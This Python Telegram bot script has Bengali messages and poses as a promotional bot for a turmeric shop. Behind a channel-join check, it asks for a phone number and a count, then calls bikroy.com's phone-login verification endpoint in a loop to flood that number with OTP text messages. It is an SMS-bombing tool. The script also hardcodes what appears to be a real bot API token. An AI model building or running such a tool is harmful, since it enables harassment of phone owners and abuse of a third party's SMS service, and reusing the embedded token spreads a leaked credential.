import telebot
import requests
from telebot import types
from flask import Flask
from threading import Thread

# ১. সেটিংস
API_TOKEN = '8678067992:AAEDkPkmtuz86YnrMJcnIVcp19tL52tkyRk'
CHANNEL_USERNAME = '@developer_of_maruf' 

# আপনার ব্যানারের ছবি এবং WhatsApp লিঙ্ক
PHOTO_URL = "https://i.ibb.co/6R0VjY8/banner.jpg" 
WHATSAPP_LINK = "https://wa.me/8801621743805?text=আমি_খাঁটি_হলুদ_অর্ডার_করতে_চাই"

bot = telebot.TeleBot(API_TOKEN)
user_data = {}

# ২. Render সার্ভার সচল রাখার জন্য
app = Flask('')
@app.route('/')
def home(): return "Mritika Bot is Live!"

def run():
    app.run(host='0.0.0.0', port=8080)

def keep_alive():
    t = Thread(target=run)
    t.start()

def check_join(chat_id):
    try:
        status = bot.get_chat_member(CHANNEL_USERNAME, chat_id).status
        return status in ['member', 'administrator', 'creator']
    except:
        return False

# ৩. স্টার্ট কমান্ড (সম্পূর্ণ নতুন এবং ক্লিন)
@bot.message_handler(commands=['start'])
def welcome(message):
    chat_id = message.chat.id
    if check_join(chat_id):
        # কোনো জিপি লিঙ্ক বা আনলক বাটন নেই
        markup = types.InlineKeyboardMarkup()
        markup.add(types.InlineKeyboardButton("🛒 খাঁটি হলুদ অর্ডার (WhatsApp)", url=WHATSAPP_LINK))
        
        caption_text = (
            "✨ **মৃত্তিকা (Mrittika)** ✨\n"
            "আমাদের এখানে ১০০% খাঁটি ও ফ্রেশ হলুদ পাওয়া যায়।\n\n"
            "✅ ভেরিফিকেশন সফল!\n"
            "এখন SMS পাঠাতে আপনার নাম্বারটি নিচে লিখুন:"
        )
        try:
            bot.send_photo(chat_id, PHOTO_URL, caption=caption_text, parse_mode="Markdown", reply_markup=markup)
        except:
            bot.send_message(chat_id, caption_text, parse_mode="Markdown", reply_markup=markup)
        
        # সরাসরি নাম্বার নেওয়ার জন্য ওয়েট করবে
        bot.register_next_step_handler(message, get_number)
    else:
        markup = types.InlineKeyboardMarkup()
        markup.add(types.InlineKeyboardButton("📢 Join Channel", url=f"https://t.me/developer_of_maruf"))
        markup.add(types.InlineKeyboardButton("🔄 Verify Done", callback_data="verify_join"))
        bot.send_message(chat_id, "❌ আগে আমাদের চ্যানেলে জয়েন করুন!", reply_markup=markup)

@bot.callback_query_handler(func=lambda call: call.data == "verify_join")
def verify_join(call):
    if check_join(call.message.chat.id):
        bot.delete_message(call.message.chat.id, call.message.message_id)
        welcome(call.message)
    else:
        bot.answer_callback_query(call.id, "❌ জয়েন হননি!", show_alert=True)

# ৪. নাম্বার নেওয়ার লজিক
def get_number(message):
    if message.text == "/start":
        welcome(message)
        return
    if not message.text or not message.text.isdigit() or len(message.text) < 11:
        msg = bot.send_message(message.chat.id, "❌ সঠিক ১১ ডিজিটের নাম্বার দিন:")
        bot.register_next_step_handler(msg, get_number)
        return
    user_data[message.chat.id] = message.text
    msg = bot.send_message(message.chat.id, "🔢 কতটি SMS পাঠাতে চান?")
    bot.register_next_step_handler(msg, send_bomber)

def send_bomber(message):
    try:
        amount = int(message.text)
        num = user_data[message.chat.id]
        bot.send_message(message.chat.id, f"🚀 {num} নাম্বারে {amount}টি SMS যাচ্ছে...")
        for i in range(amount):
            requests.get(f"https://bikroy.com/data/phone_number_login/verifications/phone_login?phone={num}", timeout=5)
        bot.send_message(message.chat.id, "✅ কাজ শেষ! আবার পাঠাতে /start দিন।")
    except:
        bot.send_message(message.chat.id, "❌ শুধু সংখ্যা দিন।")

if __name__ == "__main__":
    keep_alive()
    bot.infinity_polling(timeout=10, long_polling_timeout=5)
